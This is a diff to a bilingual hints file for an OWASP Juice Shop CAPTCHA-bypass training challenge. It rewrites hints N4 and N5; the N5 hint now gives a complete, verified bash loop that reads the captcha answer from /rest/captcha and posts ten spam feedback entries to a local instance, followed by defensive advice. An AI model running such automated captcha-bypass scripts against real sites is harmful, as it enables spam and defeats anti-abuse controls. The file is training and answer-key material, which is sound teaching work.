@@ -44,48 +44,56 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Script Python : `for i in range(10): r = requests.get('/api/captcha');
-      ans = eval(r.json()['captcha']); requests.post('/api/Feedbacks',
-      json={'comment': f'msg{i}', 'rating': 5, 'captcha': str(ans),
-      'captchaId': r.json()['captchaId']})`. Le serveur verify.ts:37-41
-      detecte 10 reqs en <20s.
+      Le CAPTCHA du formulaire de feedback est a usage unique mais le
+      serveur ne limite pas le DEBIT : il compte seulement les envois.
+      Le challenge se resout si 10 envois de feedback valides arrivent
+      en moins de 20 secondes (routes/verify.ts, captchaBypassChallenge).
+      Le CAPTCHA s'obtient par GET /rest/captcha, dont la reponse
+      contient DEJA la solution (champ answer) : on peut donc
+      automatiser.
     text_en: |
-      Python script: `for i in range(10): r = requests.get('/api/captcha');
-      ans = eval(r.json()['captcha']); requests.post('/api/Feedbacks',
-      json={'comment': f'msg{i}', 'rating': 5, 'captcha': str(ans),
-      'captchaId': r.json()['captchaId']})`. Server verify.ts:37-41
-      detects 10 reqs in <20s.
+      The feedback form CAPTCHA is single-use but the server does not
+      rate-limit: it only counts submissions. The challenge solves if 10
+      valid feedback submissions arrive within 20 seconds
+      (routes/verify.ts, captchaBypassChallenge). The CAPTCHA comes from
+      GET /rest/captcha, whose response ALREADY contains the solution
+      (answer field): so it can be automated.
     pedagogical_intent: |
-      Spell working script.
+      Give the exact condition (10 in 20 s) and the self-solving captcha.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Workflow : (1) DevTools Network sur
-      /#/contact > submit manuel > inspect POST /api/Feedbacks. (2) Notes
-      shape body : { comment, rating, captcha, captchaId }. (3) Notes que
-      GET /api/captcha retourne { captcha: "3+5", captchaId: 42 }. (4)
-      Script bash :
-      `for i in $(seq 1 10); do C=$(curl -s localhost:3000/api/captcha);
-      ID=$(echo $C | jq .captchaId); MATH=$(echo $C | jq -r .captcha);
-      ANS=$(echo "$MATH" | bc); curl -X POST -H "Content-Type:
-      application/json" -d "{\"comment\":\"x$i\",\"rating\":5,\"captcha\":
-      \"$ANS\",\"captchaId\":$ID}" localhost:3000/api/Feedbacks; done`. (5)
-      verify.ts:37-41 detecte 10 reqs en <20s, solve. Defense : express-
-      rate-limit (max=5/min) + express-slow-down + reCAPTCHA v3 + honeypot
-      + behavioral analysis. Source : verify.ts:37-41.
+      Solution (verifiee en recette sur Juice Shop 19.2.1) : boucle 10
+      fois, en recuperant un captcha a chaque tour et en le renvoyant :
+        for i in $(seq 1 10); do
+          C=$(curl -s http://127.0.0.1:3000/rest/captcha)
+          ID=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['captchaId'])")
+          A=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['answer'])")
+          curl -s -o /dev/null -X POST http://127.0.0.1:3000/api/Feedbacks \
+            -H "Content-Type: application/json" \
+            -d "{\"captchaId\":$ID,\"captcha\":\"$A\",\"comment\":\"spam $i\",\"rating\":1}"
+        done
+      Au 10e envoi en moins de 20 s, le challenge est resolu. Endpoint
+      du captcha : /rest/captcha (pas /api/captcha).
+      Defense : limiter le debit du formulaire (par IP/compte), ne pas
+      renvoyer la solution du captcha au client, et invalider chaque
+      captcha apres usage.
     text_en: |
-      Workflow: (1) DevTools Network on /#/contact
-      > manual submit > inspect POST /api/Feedbacks. (2) Note body shape:
-      { comment, rating, captcha, captchaId }. (3) Note GET /api/captcha
-      returns { captcha: "3+5", captchaId: 42 }. (4) Bash script:
-      `for i in $(seq 1 10); do C=$(curl -s localhost:3000/api/captcha);
-      ID=$(echo $C | jq .captchaId); MATH=$(echo $C | jq -r .captcha);
-      ANS=$(echo "$MATH" | bc); curl -X POST -H "Content-Type:
-      application/json" -d "{\"comment\":\"x$i\",\"rating\":5,\"captcha\":
-      \"$ANS\",\"captchaId\":$ID}" localhost:3000/api/Feedbacks; done`. (5)
-      verify.ts:37-41 detects 10 reqs in <20s, solve. Defense: express-
-      rate-limit (max=5/min) + express-slow-down + reCAPTCHA v3 +
-      honeypot + behavioral analysis. Source: verify.ts:37-41.
+      Solution (verified during testing on Juice Shop 19.2.1): loop 10
+      times, fetching a captcha each round and sending it back:
+        for i in $(seq 1 10); do
+          C=$(curl -s http://127.0.0.1:3000/rest/captcha)
+          ID=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['captchaId'])")
+          A=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['answer'])")
+          curl -s -o /dev/null -X POST http://127.0.0.1:3000/api/Feedbacks \
+            -H "Content-Type: application/json" \
+            -d "{\"captchaId\":$ID,\"captcha\":\"$A\",\"comment\":\"spam $i\",\"rating\":1}"
+        done
+      On the 10th submission within 20 s, the challenge solves. Captcha
+      endpoint: /rest/captcha (not /api/captcha).
+      Defense: rate-limit the form (per IP/account), do not return the
+      captcha solution to the client, and invalidate each captcha after
+      use.
     pedagogical_intent: |
-      Solution + multi-layer defense.
+      Full verified solution: loop with /rest/captcha, exact condition.
